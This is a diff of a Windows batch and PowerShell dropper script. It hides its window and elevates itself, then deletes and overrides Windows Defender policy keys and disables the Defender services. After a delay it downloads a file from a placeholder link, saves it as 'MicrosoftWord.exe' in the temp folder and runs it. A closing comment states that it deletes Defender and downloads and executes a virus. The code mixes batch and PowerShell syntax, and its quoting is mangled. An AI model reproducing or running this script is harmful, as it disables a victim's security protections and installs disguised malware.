@@ -1,8 +1,8 @@
-if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-@echo off
-Timeout 300 > NUL
 Start-Process -FilePath "$env:comspec" -Verb
-RunAs -WindowStyle hidden- ArgumentList "reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+RunAs -WindowStyle hidden -ArgumentList "
+Start-Sleep -s 300
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+RunAs -WindowStyle hidden reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
@@ -38,10 +38,10 @@ reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWOR
 reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
 cls 
-exit"
+exit
 Timeout 1800 > NUL
 Start-Process -FilePath "powershell" -Verb
 RunAs -WindowStyle hidden -ArgumentList "$source = "Link"; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
-Start-Process -FilePath %TEMP%\MicrosoftWord.exe"
+Start-Process -FilePath %TEMP%\MicrosoftWord.exe" "
 
 rem currently this bat file will ,on execution, delete Windows defender and download and execute a virus.
